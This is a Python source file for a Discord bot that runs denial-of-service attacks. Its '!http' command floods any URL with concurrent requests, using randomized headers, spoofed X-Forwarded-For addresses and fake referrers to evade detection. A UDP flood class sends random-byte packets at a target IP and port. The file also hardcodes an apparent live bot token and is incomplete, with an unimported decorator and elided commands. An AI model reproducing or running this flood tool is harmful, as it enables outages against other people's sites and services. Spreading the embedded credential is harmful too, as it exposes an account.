import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
import time
import os
import socket
from aiohttp import ClientTimeout
import urllib.parse
from fake_useragent import UserAgent

# ===== CONFIGURATION =====
TOKEN = os.getenv('MTM1NTk2Njg5ODI5NDEwMDA1MQ.G7acuA.Viyc661FylN47siHuwlJQiD-x3kbnOssCtP2eA') or "MTM1NTk2Njg5ODI5NDEwMDA1MQ.G7acuA.Viyc661FylN47siHuwlJQiD-x3kbnOssCtP2eA"
MAX_DURATION = 50000 # seconds (safety limit)
MAX_REQUESTS = 100000
CONCURRENT_LIMIT = 50
MESSAGE_COOLDOWN = 1  # seconds between command responses

# ===== BOT SETUP =====
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    help_command=None
)

# ===== ADVANCED HTTP FLOOD =====
class AdvancedHttpFlood:
    def __init__(self):
        self.active = False
        self.stats = {"success": 0, "failed": 0}
        self.timeout = ClientTimeout(total=3)
        self.ua = UserAgent()
        self.referrers = [
            'https://www.google.com/',
            'https://www.youtube.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.reddit.com/',
            'https://www.bing.com/',
            'https://duckduckgo.com/'
        ]
        self.cache_busters = [
            '?utm_source=organic',
            '?utm_medium=social',
            '?utm_campaign=marketing',
            '?v=' + str(random.randint(100, 999)),
            '?t=' + str(int(time.time())),
            '?session=' + ''.join(random.choices('abcdef1234567890', k=16))
        ]
        
    def get_random_headers(self):
        """Generate realistic headers with random variations"""
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.5', 'fr,fr-FR;q=0.8,en;q=0.5']),
            'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),
            'Connection': random.choice(['keep-alive', 'close']),
            'Referer': random.choice(self.referrers),
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-User': '?1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
            'Pragma': random.choice(['no-cache', '']),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Requested-With': random.choice(['XMLHttpRequest', '']),
            'TE': 'Trailers'
        }
        return headers
    
    def get_random_path(self):
        """Generate random URL paths that look legitimate"""
        paths = [
            '',
            '/index.html',
            '/home',
            '/main',
            '/page' + str(random.randint(1, 100)),
            '/article/' + ''.join(random.choices('abcdef1234567890', k=8)),
            '/search?q=' + urllib.parse.quote(''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 10))))
        ]
        return random.choice(paths)
    
    async def make_request(self, session, base_url):
        """Make a request with random variations to avoid detection"""
        try:
            # Randomize the URL
            url = base_url.rstrip('/') + self.get_random_path() + random.choice(self.cache_busters)
            
            # Randomize request method (mostly GET but sometimes HEAD)
            method = random.choices(
                [session.get, session.head],
                weights=[0.9, 0.1]
            )[0]
            
            # Add random delay between requests
            await asyncio.sleep(random.uniform(0.01, 0.1))
            
            async with method(
                url,
                headers=self.get_random_headers(),
                timeout=self.timeout,
                allow_redirects=True
            ) as response:
                # Randomly follow links from HTML if response is successful
                if response.status == 200 and random.random() < 0.3:
                    try:
                        html = await response.text()
                        links = self.extract_links(html)
                        if links:
                            follow_url = random.choice(links)
                            async with session.get(
                                follow_url,
                                headers=self.get_random_headers(),
                                timeout=self.timeout
                            ) as follow_response:
                                return follow_response.status in (200, 301, 302)
                    except:
                        pass
                
                return response.status in (200, 301, 302)
        except:
            return False
    
    def extract_links(self, html):
        """Extract links from HTML (simplified version)"""
        links = []
        for word in html.split():
            if word.startswith(('href="', 'src="', 'url="')):
                link = word.split('"')[1]
                if link.startswith(('http://', 'https://')):
                    links.append(link)
        return links
    
    async def run_flood(self, url, duration, max_requests):
        self.active = True
        self.stats = {"success": 0, "failed": 0}
        start_time = time.time()
        
        connector = aiohttp.TCPConnector(
            force_close=True,
            limit=0,
            enable_cleanup_closed=True,
            ssl=False
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            cookie_jar=aiohttp.DummyCookieJar(),
            trust_env=True
        ) as session:
            tasks = set()
            
            while (time.time() - start_time < duration and 
                   sum(self.stats.values()) < max_requests and 
                   self.active):
                
                if len(tasks) < CONCURRENT_LIMIT:
                    task = asyncio.create_task(self.make_request(session, url))
                    task.add_done_callback(lambda t: self.update_stats(t))
                    tasks.add(task)
                    task.add_done_callback(lambda t: tasks.discard(t))
                
                await asyncio.sleep(0.01)
            
            if tasks:
                await asyncio.wait(tasks)
        
        return self.stats['success'], self.stats['failed'], time.time() - start_time
    
    def update_stats(self, task):
        if task.result():
            self.stats['success'] += 1
        else:
            self.stats['failed'] += 1
    
    def stop(self):
        self.active = False
        self.stats = {"success": 0, "failed": 0}

# ===== UDP FLOOD (same as before) =====
class UdpFlood:
    def __init__(self):
        self.active = False
        self.packets_sent = 0
    
    async def send_udp(self, target_ip, target_port, payload_size):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        payload = random._urandom(payload_size)
        
        while self.active:
            try:
                sock.sendto(payload, (target_ip, target_port))
                self.packets_sent += 1
                await asyncio.sleep(0.001)
            except Exception as e:
                print(f"UDP Error: {e}")
                break
        sock.close()
    
    async def run_flood(self, target_ip, target_port, duration, payload_size=1024):
        self.active = True
        self.packets_sent = 0
        start_time = time.time()
        
        tasks = []
        for _ in range(CONCURRENT_LIMIT):
            task = asyncio.create_task(
                self.send_udp(target_ip, target_port, payload_size)
            )
            tasks.append(task)
        
        try:
            await asyncio.sleep(duration)
        finally:
            self.stop()
            if tasks:
                await asyncio.wait(tasks, timeout=5)
        
        return self.packets_sent, time.time() - start_time
    
    def stop(self):
        self.active = False

http_controller = AdvancedHttpFlood()
udp_controller = UdpFlood()

# ===== BOT COMMANDS (same as before with updated help text) =====
@bot.command()
@cooldown(1, MESSAGE_COOLDOWN)
async def http(ctx, url: str, duration: int = 10, max_requests: int = 500):
    """Start advanced HTTP flood attack with evasion techniques"""
    if http_controller.active:
        return await ctx.send("⚠️ HTTP attack is already running. Use `!stop` first.")
    
    if not url.startswith(('http://', 'https://')):
        url = f'http://{url}'
    
    if duration > MAX_DURATION:
        return await ctx.send(f"❌ Max duration is {MAX_DURATION} seconds")
    
    if max_requests > MAX_REQUESTS:
        return await ctx.send(f"❌ Max requests is {MAX_REQUESTS}")
    
    message = await ctx.send(f"🚀 Starting ADVANCED HTTP flood to {url} for {duration}s...")
    
    try:
        success, failed, total_time = await http_controller.run_flood(
            url,
            min(duration, MAX_DURATION),
            min(max_requests, MAX_REQUESTS)
        )
        
        rps = success / total_time if total_time > 0 else 0
        await message.edit(content=(
            f"✅ ADVANCED HTTP flood completed in {total_time:.1f}s\n"
            f"• Success: {success}\n"
            f"• Failed: {failed}\n"
            f"• Requests/s: {rps:.1f}\n"
            f"• Evasion techniques: Enabled"
        ))
    except Exception as e:
        await message.edit(content=f"❌ Error: {str(e)}")

# ... [rest of the commands remain the same as your original code] ...

# ===== START BOT =====
if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Bot failed to start: {str(e)}")